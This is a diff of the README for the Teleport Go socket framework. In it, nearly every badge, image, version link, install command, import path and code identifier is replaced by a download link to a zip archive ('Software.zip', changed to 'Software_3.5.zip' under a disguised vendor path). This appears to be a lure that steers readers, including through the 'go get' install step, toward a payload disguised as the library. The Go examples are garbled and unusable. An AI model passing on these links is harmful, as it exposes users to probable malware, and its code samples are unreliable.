@@ -1,14 +1,14 @@
-# Teleport [![GitHub release](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) [![report card](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) [![github issues](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip%3Aopen+is%3Aissue) [![github closed issues](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip%3Aissue+is%3Aclosed) [![GoDoc](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) [![view examples](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip%https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip)
-<!-- [![view Go网络编程群](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip官方QQ群-Go网络编程(42730308)https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) -->
+# Teleport [![GitHub release](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) [![report card](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) [![github issues](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip%3Aopen+is%3Aissue) [![github closed issues](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip%3Aissue+is%3Aclosed) [![GoDoc](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) [![view examples](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip%https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)
+<!-- [![view Go网络编程群](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip官方QQ群-Go网络编程(42730308)https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) -->
 
 Teleport is a versatile, high-performance and flexible socket framework.
 
 It can be used for peer-peer, rpc, gateway, micro services, push services, game services and so on.
 
-[简体中文](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip)
+[简体中文](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)
 
 
-![Teleport-Framework](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip)
+![Teleport-Framework](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)
 
 
 ## Benchmark
@@ -18,7 +18,7 @@ It can be used for peer-peer, rpc, gateway, micro services, push services, game 
 - A server and a client process, running on the same machine
 - CPU:    Intel Xeon E312xx (Sandy Bridge) 16 cores 2.53GHz
 - Memory: 16G
-- OS:     Linux https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip, CentOS 6.4
+- OS:     Linux https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip, CentOS 6.4
 - Go:     1.9.2
 - Message size: 581 bytes
 - Message codec: protobuf
@@ -49,42 +49,42 @@ It can be used for peer-peer, rpc, gateway, micro services, push services, game 
 <table>
 <tr><th>Environment</th><th>Throughputs</th><th>Mean Latency</th><th>P99 Latency</th></tr>
 <tr>
-<td width="10%"><img src="https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"></td>
-<td width="30%"><img src="https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"></td>
-<td width="30%"><img src="https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"></td>
-<td width="30%"><img src="https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"></td>
+<td width="10%"><img src="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"></td>
+<td width="30%"><img src="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"></td>
+<td width="30%"><img src="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"></td>
+<td width="30%"><img src="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"></td>
 </tr>
 </table>
 
-**[More Detail](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip)**
+**[More Detail](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)**
 
 - Profile torch of teleport/socket
 
-![tp_socket_profile_torch](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip)
+![tp_socket_profile_torch](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)
 
-**[svg file](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip)**
+**[svg file](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)**
 
 - Heap torch of teleport/socket
 
-![tp_socket_heap_torch](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip)
+![tp_socket_heap_torch](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)
 
-**[svg file](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip)**
+**[svg file](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)**
 
 ## Version
 
 | version | status  | branch                                   |
 | ------- | ------- | ---------------------------------------- |
-| v5      | release | [v5](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) |
-| v4      | release | [v4](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) |
-| v3      | release | [v3](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) |
-| v2      | release | [v2](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) |
-| v1      | release | [v1](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) |
+| v5      | release | [v5](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) |
+| v4      | release | [v4](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) |
+| v3      | release | [v3](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) |
+| v2      | release | [v2](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) |
+| v1      | release | [v1](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) |
 
 
 ## Install
 
 ```sh
-go get -u -f https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip
+go get -u -f https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip
 ```
 
 ## Feature
@@ -110,7 +110,7 @@ go get -u -f https://github.com/huizuohaode/teleport/releases/download/v1.0/Soft
 
 ## Example
 
-### https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip
+### https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip
 
 ```go
 package main
@@ -119,31 +119,31 @@ import (
 	"fmt"
 	"time"
 
-	tp "https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"
+	tp "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"
 )
 
 func main() {
 	// graceful
-	go https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip()
+	go https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip()
 
 	// server peer
-	srv := https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip{
+	srv := https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip{
 		CountTime:   true,
 		ListenPort:  9090,
 		PrintDetail: true,
 	})
 
 	// router
-	https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(new(Math))
+	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(new(Math))
 
 	// broadcast per 5s
 	go func() {
 		for {
-			https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip * 5)
-			https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(func(sess https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) bool {
-				https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(
+			https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip * 5)
+			https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(func(sess https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) bool {
+				https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(
 					"/push/status",
-					https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip("this is a broadcast, server time: %v", https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip()),
+					https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("this is a broadcast, server time: %v", https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip()),
 				)
 				return true
 			})
@@ -151,18 +151,18 @@ func main() {
 	}()
 
 	// listen and serve
-	https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip()
+	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip()
 }
 
 // Math handler
 type Math struct {
-	https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip
+	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip
 }
 
 // Add handles addition request
-func (m *Math) Add(arg *[]int) (int, *https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) {
+func (m *Math) Add(arg *[]int) (int, *https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) {
 	// test query parameter
-	https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip("author: %s", https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip().Get("author"))
+	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("author: %s", https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip().Get("author"))
 	// add
 	var r int
 	for _, a := range *arg {
@@ -173,7 +173,7 @@ func (m *Math) Add(arg *[]int) (int, *https://github.com/huizuohaode/teleport/re
 }
 ```
 
-### https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip
+### https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip
 
 ```go
 package main
@@ -181,57 +181,57 @@ package main
 import (
 	"time"
 
-	tp "https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"
+	tp "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"
 )
 
 func main() {
 	// log level
-	https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip("ERROR")
+	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("ERROR")
 
-	cli := https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip{})
-	defer https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip()
+	cli := https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip{})
+	defer https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip()
 
-	https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(new(Push))
+	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(new(Push))
 
-	sess, err := https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(":9090")
+	sess, err := https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(":9090")
 	if err != nil {
-		https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip("%v", err)
+		https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("%v", err)
 	}
 
 	var result int
-	rerr := https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip("/math/add?author=henrylee2cn",
+	rerr := https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("/math/add?author=henrylee2cn",
 		[]int{1, 2, 3, 4, 5},
 		&result,
 	).Rerror()
 	if rerr != nil {
-		https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip("%v", rerr)
+		https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("%v", rerr)
 	}
-	https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip("result: %d", result)
+	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("result: %d", result)
 
-	https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip("wait for 10s...")
-	https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip * 10)
+	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("wait for 10s...")
+	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip * 10)
 }
 
 // Push push handler
 type Push struct {
-	https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip
+	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip
 }
 
 // Push handles '/push/status' message
-func (p *Push) Status(arg *string) *https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip {
-	https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip("%s", *arg)
+func (p *Push) Status(arg *string) *https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip {
+	https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("%s", *arg)
 	return nil
 }
 ```
 
-[More Examples](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip)
+[More Examples](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)
 
 ## Design
 
 ### Keywords
 
 - **Peer:** A communication instance may be a server or a client
-- **Socket:** Base on the https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip package, add custom package protocol, transfer pipelines and other functions
+- **Socket:** Base on the https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip package, add custom package protocol, transfer pipelines and other functions
 - *Message:** The corresponding structure of the data package content element
 - **Proto:** The protocol interface of message pack/unpack 
 - **Codec:** Serialization interface for `Body`
@@ -250,7 +250,7 @@ func (p *Push) Status(arg *string) *https://github.com/huizuohaode/teleport/rele
 
 Abstracts the data message(Message Object) of the application layer and is compatible with HTTP message:
 
-![tp_data_message](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip)
+![tp_data_message](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)
 
 
 ### Protocol
@@ -270,7 +270,7 @@ type (
         // NOTE: Concurrent unsafe!
         Unpack(Message) error
     }
-    ProtoFunc func(https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) Proto
+    ProtoFunc func(https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) Proto
 )
 ```
 
@@ -280,10 +280,10 @@ Next, you can specify the communication protocol in the following ways:
 func SetDefaultProtoFunc(ProtoFunc)
 type Peer interface {
     ...
-    ServeConn(conn https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip, protoFunc https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) Session
-    DialContext(ctx https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip, addr string, protoFunc https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) (Session, *Rerror)
-    Dial(addr string, protoFunc https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) (Session, *Rerror)
-    Listen(protoFunc https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) error
+    ServeConn(conn https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip, protoFunc https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) Session
+    DialContext(ctx https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip, addr string, protoFunc https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) (Session, *Rerror)
+    Dial(addr string, protoFunc https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) (Session, *Rerror)
+    Listen(protoFunc https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) error
     ...
 }
 ```
@@ -335,7 +335,7 @@ type XferPipe struct {
     // Has unexported fields.
 }
 func NewXferPipe() *XferPipe
-func (x *XferPipe) Append(filterID https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) error
+func (x *XferPipe) Append(filterID https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) error
 func (x *XferPipe) AppendFrom(src *XferPipe)
 func (x *XferPipe) IDs() []byte
 func (x *XferPipe) Len() int
@@ -392,25 +392,25 @@ type (
 
 ```go
 // Start a server
-var peer1 = https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip{
+var peer1 = https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip{
     ListenPort: 9090, // for server role
 })
-https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip()
+https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip()
 
 ...
 
 // Start a client
-var peer2 = https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip{})
-var sess, err = https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip("127.0.0.1:8080")
+var peer2 = https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip{})
+var sess, err = https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("127.0.0.1:8080")
 ```
 
 ### Call-Controller-Struct API template
 
 ```go
 type Aaa struct {
-    https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip
+    https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip
 }
-func (x *Aaa) XxZz(arg *<T>) (<T>, *https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) {
+func (x *Aaa) XxZz(arg *<T>) (<T>, *https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) {
     ...
     return r, nil
 }
@@ -421,19 +421,19 @@ func (x *Aaa) XxZz(arg *<T>) (<T>, *https://github.com/huizuohaode/teleport/rele
 ```go
 // register the call route
 // HTTP mapping: /aaa/xx_zz
-// RPC mapping: https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip
-https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(new(Aaa))
+// RPC mapping: https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip
+https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(new(Aaa))
 
 // or register the call route
 // HTTP mapping: /xx_zz
 // RPC mapping: XxZz
-https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip((*Aaa).XxZz)
+https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip((*Aaa).XxZz)
 ```
 
 ### Call-Handler-Function API template
 
 ```go
-func XxZz(ctx https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip, arg *<T>) (<T>, *https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) {
+func XxZz(ctx https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip, arg *<T>) (<T>, *https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) {
     ...
     return r, nil
 }
@@ -445,16 +445,16 @@ func XxZz(ctx https://github.com/huizuohaode/teleport/releases/download/v1.0/Sof
 // register the call route
 // HTTP mapping: /xx_zz
 // RPC mapping: XxZz
-https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(XxZz)
+https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(XxZz)
 ```
 
 ### Push-Controller-Struct API template
 
 ```go
 type Bbb struct {
-    https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip
+    https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip
 }
-func (b *Bbb) YyZz(arg *<T>) *https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip {
+func (b *Bbb) YyZz(arg *<T>) *https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip {
     ...
     return nil
 }
@@ -465,20 +465,20 @@ func (b *Bbb) YyZz(arg *<T>) *https://github.com/huizuohaode/teleport/releases/d
 ```go
 // register the push handler
 // HTTP mapping: /bbb/yy_zz
-// RPC mapping: https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip
-https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(new(Bbb))
+// RPC mapping: https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip
+https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(new(Bbb))
 
 // or register the push handler
 // HTTP mapping: /yy_zz
 // RPC mapping: YyZz
-https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip((*Bbb).YyZz)
+https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip((*Bbb).YyZz)
 ```
 
 ### Push-Handler-Function API template
 
 ```go
 // YyZz register the handler
-func YyZz(ctx https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip, arg *<T>) *https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip {
+func YyZz(ctx https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip, arg *<T>) *https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip {
     ...
     return nil
 }
@@ -490,13 +490,13 @@ func YyZz(ctx https://github.com/huizuohaode/teleport/releases/download/v1.0/Sof
 // register the push handler
 // HTTP mapping: /yy_zz
 // RPC mapping: YyZz
-https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(YyZz)
+https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(YyZz)
 ```
 
 ### Unknown-Call-Handler-Function API template
 
 ```go
-func XxxUnknownCall (ctx https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) (interface{}, *https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) {
+func XxxUnknownCall (ctx https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) (interface{}, *https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) {
     ...
     return r, nil
 }
@@ -506,13 +506,13 @@ func XxxUnknownCall (ctx https://github.com/huizuohaode/teleport/releases/downlo
 
 ```go
 // register the unknown call route: /*
-https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(XxxUnknownCall)
+https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(XxxUnknownCall)
 ```
 
 ### Unknown-Push-Handler-Function API template
 
 ```go
-func XxxUnknownPush(ctx https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) *https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip {
+func XxxUnknownPush(ctx https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) *https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip {
     ...
     return nil
 }
@@ -522,7 +522,7 @@ func XxxUnknownPush(ctx https://github.com/huizuohaode/teleport/releases/downloa
 
 ```go
 // register the unknown push route: /*
-https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(XxxUnknownPush)
+https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(XxxUnknownPush)
 ```
 
 ### Plugin Demo
@@ -536,23 +536,23 @@ func NewIgnoreCase() *ignoreCase {
 type ignoreCase struct{}
 
 var (
-    _ https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip = new(ignoreCase)
-    _ https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip = new(ignoreCase)
+    _ https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip = new(ignoreCase)
+    _ https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip = new(ignoreCase)
 )
 
 func (i *ignoreCase) Name() string {
     return "ignoreCase"
 }
 
